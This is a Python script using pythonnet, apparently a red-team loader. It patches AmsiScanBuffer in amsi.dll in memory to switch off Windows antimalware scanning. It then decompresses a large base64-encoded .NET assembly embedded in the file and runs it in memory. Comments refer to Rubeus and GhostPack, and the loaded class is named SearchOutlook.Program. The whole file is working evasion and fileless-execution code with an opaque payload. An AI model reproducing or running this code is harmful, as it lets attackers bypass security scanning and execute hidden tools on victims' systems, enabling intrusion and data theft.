import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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"


def bypass():
    """
    Bypasses the Antimalware Scan Interface (AMSI) by patching the AmsiScanBuffer method in amsi.dll.
    This allows scripts to run without being scanned and potentially blocked by AMSI.
    """
    windll.LoadLibrary("amsi.dll")
    windll.kernel32.GetModuleHandleW.argtypes = [c_wchar_p]
    windll.kernel32.GetModuleHandleW.restype = c_void_p
    handle = windll.kernel32.GetModuleHandleW('amsi.dll')
    windll.kernel32.GetProcAddress.argtypes = [c_void_p, c_char_p]
    windll.kernel32.GetProcAddress.restype = c_void_p
    BufferAddress = windll.kernel32.GetProcAddress(handle, "AmsiScanBuffer")
    BufferAddress = IntPtr(BufferAddress)
    Size = System.UInt32(0x05)
    ProtectFlag = System.UInt32(0x40)
    OldProtectFlag = Marshal.AllocHGlobal(0)
    virt_prot = windll.kernel32.VirtualProtect(BufferAddress, Size, ProtectFlag, OldProtectFlag)
    patch = System.Array[System.Byte]((System.UInt32(0xB8), System.UInt32(0x57), System.UInt32(0x00), System.UInt32(0x07), System.UInt32(0x80), System.UInt32(0xC3)))
    Marshal.Copy(patch, 0, BufferAddress, 6)

def base64_to_bytes(base64_string):
    """
    Converts a base64 encoded string to a .NET byte array after decompressing it.
    Args:
        base64_string: The base64 encoded and compressed string to convert.
    Returns:
        A .NET byte array of the decompressed data.
    """
    # Decode the base64 string to get the compressed binary data
    compressed_data = base64.b64decode(base64_string)
    # Decompress the data
    decompressed_data = zlib.decompress(compressed_data)
    # Convert the decompressed binary data to a .NET byte array
    return System.Array[System.Byte](decompressed_data)

def load_and_execute_assembly(command):
    """
    Loads a .NET assembly from a base64 encoded and compressed string, and executes a specified method.
    Args:
        command: The command to execute within the loaded assembly.
    Returns:
        The result of the executed command.
    """
    
    assembly_bytes = base64_to_bytes(base64_str)
    
    # Load the assembly
    assembly = Assembly.Load(assembly_bytes)
    
    # Get the type of the Rubeus.Program class
    program_type = assembly.GetType("SearchOutlook.Program")
    # You don't need to create an instance of the class for a static method
    method = program_type.GetMethod("MainString")
    #Have to do this nesting thing to deal with different main entry points and public/private methods  
    if method == None:
        method =program_type.GetMethod("Main")
        if method == None:
            method = program_type.GetMethod("Main",Reflection.BindingFlags.NonPublic | Reflection.BindingFlags.Static)
        # Create a jagged array to pass in an array of string arrays to satisfy arguments requirements
        command_array = Array[str]([command])
        command_args = System.Array[System.Object]([command_array])
    else:
        #Ghost Pack stuff like rubeus use a different input
        command_args = Array[str]([command]) 

    # Invoke the MainString method
    result = method.Invoke(None, command_args)

    return result
    
def main():
    bypass()
    parser = argparse.ArgumentParser(description='Execute a command on a hardcoded base64 encoded assembly')
    parser.add_argument('command', type=str, nargs='?', default="", 
                        help='Command to execute (like "help" or "triage"). If not specified, a default command is executed.')

    args = parser.parse_args()
    
    result = load_and_execute_assembly(args.command)
    print(result)

if __name__ == "__main__":
    main()